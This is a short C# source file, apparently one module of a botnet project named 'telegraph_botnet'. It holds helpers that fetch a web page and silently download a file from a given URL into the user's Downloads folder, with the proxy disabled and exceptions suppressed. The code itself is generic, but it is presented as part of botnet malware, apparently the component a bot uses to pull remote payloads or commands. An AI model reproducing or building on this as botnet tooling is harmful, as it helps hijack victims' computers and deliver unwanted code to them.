using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace telegraph_botnet
{
    internal class web
    {
        public static string GetHTML(string URL)
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;

            return wc.DownloadString(URL);
        }
        public static string DownloadFile(string URL)
        {
            string file_name = Path.GetFileName(URL);
            //string temp_path = Path.GetTempPath();
            string temp_path = Environment.GetEnvironmentVariable("USERPROFILE") + @"\" + "Downloads"; ;

            string file_path = Path.Combine(temp_path, file_name);

            WebClient wc = new WebClient();
            wc.Proxy = null;
            try
            {
                wc.DownloadFile(URL, file_path);
            }
            catch (Exception ex) { }
            return file_path;
        }
    }
}
